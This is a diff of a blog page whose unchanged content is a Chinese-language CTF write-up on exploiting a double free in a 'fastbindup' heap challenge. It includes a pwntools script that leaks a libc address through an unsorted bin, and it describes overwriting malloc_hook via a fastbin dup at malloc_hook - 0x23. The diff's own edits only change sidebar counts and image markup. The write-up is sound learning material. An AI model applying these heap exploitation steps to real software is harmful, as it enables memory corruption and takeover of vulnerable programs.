@@ -220,11 +220,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
@@ -333,21 +333,21 @@
 
 <p>觀察一下這裡，他是去找g_ptrs裡面有沒有然後再free掉，但很顯然的g_ptrs就算你free掉了，也不會把它清掉所以就可以double free</p>
 <p>並且打這題目前要有一個先備知識，要怎麼leak libc，我們打算透過fastbin dup來改malloc_hook，那就必須要有libc base，這邊可以用unsorted bin來leak，因為當unsorted bin被free掉時候，fd、bk會指向一個libc address</p>
-<p>像是這樣，我先malloc一個<br><div class="img-item" data-src="https://hackmd.io/_uploads/SJX_vpOv0.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SJX_vpOv0.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>然後free，就可以發現有了<br><div class="img-item" data-src="https://hackmd.io/_uploads/rk_6Pp_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rk_6Pp_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>像是這樣，我先malloc一個<br><img src="https://hackmd.io/_uploads/SJX_vpOv0.png" alt="image"></p>
+<p>然後free，就可以發現有了<br><img src="https://hackmd.io/_uploads/rk_6Pp_PR.png" alt="image"></p>
 <p>接下來我透過在malloc一次一樣大小的來拿到同一塊，並且fd、bk沒有被清空，用get，就可以把它印出來了</p>
-<p>拿offset<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkhSB0uPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkhSB0uPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>拿offset<br><img src="https://hackmd.io/_uploads/SkhSB0uPC.png" alt="image"></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; 0x72db424aab78-0x72db420e6000</span><br><span class="line">3951480</span><br><span class="line">&gt;&gt;&gt; hex(3951480)</span><br><span class="line">&#x27;0x3c4b78&#x27;</span><br></pre></td></tr></table></figure>
 
 <p>目前這樣可以leak libc</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG=<span class="built_in">input</span>(<span class="string">&#x27;open debug?(y/n)&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">        context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">        context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;1&#x27;</span>)  </span><br><span class="line">	<span class="comment">#print(&quot;malloc size: &quot;, size)</span></span><br><span class="line">	r.sendline(<span class="built_in">str</span>(size).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get</span>(<span class="params">idx</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(idx).encode())</span><br><span class="line">	r.recvuntil(<span class="string">b&#x27;]: &#x27;</span>)</span><br><span class="line">	chunk_str=r.recvline().strip()</span><br><span class="line">	<span class="keyword">return</span> chunk_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">index, payload</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line">	r.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">	r.sendline(<span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./fastbindup&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG==<span class="string">&#x27;y&#x27;</span>:</span><br><span class="line">	gdb.attach(r)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x3c4b78</span></span><br><span class="line">create(<span class="number">0x480</span>) <span class="comment">#unsorted bin</span></span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line">create(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>) <span class="comment">#delete unsorted bin -&gt; fd,bk -&gt; libc address</span></span><br><span class="line">create(<span class="number">0x480</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(get(4)))</span></span><br><span class="line"></span><br><span class="line">leak_libc=u64(get(<span class="number">4</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">libc_base=leak_libc-offset</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ leak libc : &quot;</span>,<span class="built_in">hex</span>(leak_libc))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;NAUPINFO @ libc base : &quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>再來就是要寫malloc hook了，這邊先做一件事，我們先到malloc hook去看看<br>我們需要bypass一個安全機制，較chunk size要一樣<br><div class="img-item" data-src="https://hackmd.io/_uploads/SkGTFRuPC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SkGTFRuPC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>再來就是要寫malloc hook了，這邊先做一件事，我們先到malloc hook去看看<br>我們需要bypass一個安全機制，較chunk size要一樣<br><img src="https://hackmd.io/_uploads/SkGTFRuPC.png" alt="image"></p>
 <p>觀察一下會發現，他有很多0x7c之類的東西<br>如果能把它當header size(推到header最尾端)就可以bypass</p>
-<p>推一下就可以把他推到後面了(malloc hook - 0x33)<br><div class="img-item" data-src="https://hackmd.io/_uploads/H12yoA_PR.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H12yoA_PR.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p>推一下就可以把他推到後面了(malloc hook - 0x33)<br><img src="https://hackmd.io/_uploads/H12yoA_PR.png" alt="image"></p>
 <p>所以我們應該跳到(malloc hook - 0x23)</p>
-<p><div class="img-item" data-src="https://hackmd.io/_uploads/B11ViCdPA.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/B11ViCdPA.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
-<p>跳到<code>libc base + malloc hook offset - 0x23</code><br><div class="img-item" data-src="https://hackmd.io/_uploads/rJ1hs0_PC.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJ1hs0_PC.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<p><img src="https://hackmd.io/_uploads/B11ViCdPA.png" alt="image"></p>
+<p>跳到<code>libc base + malloc hook offset - 0x23</code><br><img src="https://hackmd.io/_uploads/rJ1hs0_PC.png" alt="image"></p>
 <p>bypass</p>
 <p>接下來要做fastbin dup</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chunk 0 -&gt; 0x440</span><br><span class="line">chunk 1 -&gt; 0x70</span><br><span class="line">chunk 2 -&gt; 0x70</span><br><span class="line">chunk 3 -&gt; 0x70</span><br></pre></td></tr></table></figure>
@@ -469,7 +469,7 @@
     
       <div>
         <span class="icon-brush"></span>
-        149.8k
+        149.6k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
         13:10
@@ -521,11 +521,11 @@
   </div>
   <div class="sidebar-state-category">
     <div>Categories</div>
-    <div class="sidebar-state-number">4</div>
+    <div class="sidebar-state-number">0</div>
   </div>
   <div class="sidebar-state-tag">
     <div>Tags</div>
-    <div class="sidebar-state-number">0</div>
+    <div class="sidebar-state-number">16</div>
   </div>
 </div>
 <div class="sidebar-social">
